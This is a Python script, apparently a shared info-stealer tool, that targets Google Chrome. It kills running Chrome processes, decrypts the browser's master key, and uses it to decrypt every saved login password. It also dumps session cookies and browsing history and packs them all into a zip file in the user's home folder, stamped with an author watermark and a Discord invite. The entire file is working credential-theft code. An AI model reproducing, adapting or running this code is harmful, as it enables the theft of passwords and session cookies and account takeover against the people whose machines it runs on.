import zipfile, time, string, random, shutil, psutil, sqlite3, base64, json, os
from co.discordinv import discordinv
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")
browsers = {
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
}
def kill_chrome():
    """Kills all Chrome processes before extracting data."""
    for proc in psutil.process_iter(['pid', 'name']):
        if 'chrome.exe' in proc.info['name'].lower():
            try:
                proc.terminate()
                print("Terminated Chrome process:", proc.info['pid'])
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
def get_master_key(path: str):
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    if "os_crypt" not in local_state or "encrypted_key" not in local_state["os_crypt"]:
        return None
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    try:
        master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        print(f"Error decrypting master key for {path}: {e}")
        return None
def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)[:-16].decode()
    return decrypted_pass
def random_filename(prefix):
    return f"{prefix}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=4))}"
def get_login_data(path: str, profile: str, master_key):
    result = ""
    login_db = os.path.join(path, profile, "Login Data")
    if not os.path.exists(login_db):
        return None
    temp_login_db = os.path.join(user + '\\AppData\\Local\\Temp', random_filename('login_db'))
    shutil.copy(login_db, temp_login_db)
    conn = sqlite3.connect(temp_login_db)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        if row[0] and row[1] and row[2]:
            password = decrypt_password(row[2], master_key)
            result += f"Browser: {profile}\nURL: {row[0]}\nEmail: {row[1]}\nPassword: {password}\n"
            result += "------------MADE BY RAYWZW--------------\n"  # Add watermark after each entry
    conn.close()
    os.remove(temp_login_db)
    result += f"\n{discordinv}"
    return result

def get_cookies(path: str, profile: str):
    network_folder = os.path.join(path, profile, "Network")
    cookies_db = os.path.join(network_folder, "Cookies")
    if not os.path.exists(network_folder):
        print(f"Error: Network folder does not exist in profile {profile}.")
        return None
    if not os.path.exists(cookies_db):
        print(f"Error: Cookies file does not exist in the Network folder for profile {profile}.")
        return None
    result = ""
    temp_filename = f'cookies_db_{''.join(random.choices(string.ascii_lowercase + string.digits, k=4))}.db'
    temp_path = os.path.join(user, 'AppData', 'Local', 'Temp', temp_filename)
    shutil.copy(cookies_db, temp_path)
    try:
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute('SELECT name, value, host_key, path, expires_utc FROM cookies')
        
        for row in cursor.fetchall():
            host = row[2] if row[2].startswith('.') else '.' + row[2]
            result += f"{host}\tTRUE\t{row[3]}\t{str(int(row[4] / 1000000))}\t{row[4]}\t{row[0]}\t{row[1]}\n"
        
        conn.close()
        os.remove(temp_path)
    except Exception as e:
        print(f"Error reading cookies for profile {profile}: {e}")
        os.remove(temp_path)
        return None    
    return result
def add_watermark(content: str) -> str:
    watermark = "\n------------MADE BY RAYWZW--------------\n"
    return f"{watermark}{content}\nP--------------{discordinv}--------------"
def random_filename(prefix):
    return f"{prefix}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=4))}"
def convert_timestamp(timestamp):
    timestamp = timestamp / 1000000 - 11644473600
    return time.strftime('%B, %d, %Y at %I%p', time.gmtime(timestamp))

def get_history(path: str, profile: str):
    history_db = os.path.join(path, profile, "History")
    if not os.path.exists(history_db):
        return None
    result = ""
    temp_history_db = os.path.join(user + '\\AppData\\Local\\Temp', random_filename('history_db'))
    shutil.copy(history_db, temp_history_db)
    conn = sqlite3.connect(temp_history_db)
    cursor = conn.cursor()
    cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls')
    for row in cursor.fetchall():
        last_visited = convert_timestamp(row[3])
        result += f"Browser: {profile}\nURL: {row[0]}\nTitle: {row[1]}\nVisit Count: {row[2]}\nLast Visited: {last_visited}\n"
    conn.close()
    os.remove(temp_history_db)
    return add_watermark(result)
def save_results(logins, cookies, history):
    zip_filename = os.path.join(user, 'chrome.zip')
    
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        if logins:
            logins_filename = os.path.join(user, 'logins.txt')
            with open(logins_filename, 'w', encoding="utf-8") as logins_file:
                logins_file.write(logins)
            zipf.write(logins_filename, "logins.txt")
            os.remove(logins_filename)
        
        if cookies:
            cookies_filename = os.path.join(user, 'cookies.txt')
            with open(cookies_filename, 'w', encoding="utf-8") as cookies_file:
                cookies_file.write(cookies)
            zipf.write(cookies_filename, "cookies.txt")
            os.remove(cookies_filename)
        
        if history:
            history_filename = os.path.join(user, 'webhistory.txt')
            with open(history_filename, 'w', encoding="utf-8") as history_file:
                history_file.write(history)
            zipf.write(history_filename, "webhistory.txt")
            os.remove(history_filename)
    
    print(f"Saved login data, cookies, and history in chrome.zip.")

def extract_logins_cookies_history():
    total_browsers = 0
    combined_logins = ""
    combined_cookies = ""
    combined_history = ""
    
    kill_chrome()
    time.sleep(2)
    for browser, path in browsers.items():
        if not os.path.exists(path):
            print(f"Error: {browser} directory does not exist.")
            continue
        master_key = get_master_key(path)
        if not master_key:
            print(f"Error: Could not get master key for {browser}.")
            continue        
        for root, dirs, files in os.walk(path):
            for profile in dirs:
                login_data = get_login_data(path, profile, master_key)
                cookies_data = get_cookies(path, profile)
                history_data = get_history(path, profile)
                
                if login_data:
                    combined_logins += login_data
                    total_browsers += 1
                if cookies_data:
                    combined_cookies += cookies_data
                if history_data:
                    combined_history += history_data
    
    save_results(combined_logins, combined_cookies, combined_history)
    print(f"Extracted login data, cookies, and history from {total_browsers} profiles across Chrome.")
extract_logins_cookies_history()
#well, this is awkward...
# if ur seeing this pls dont edit the discord server invite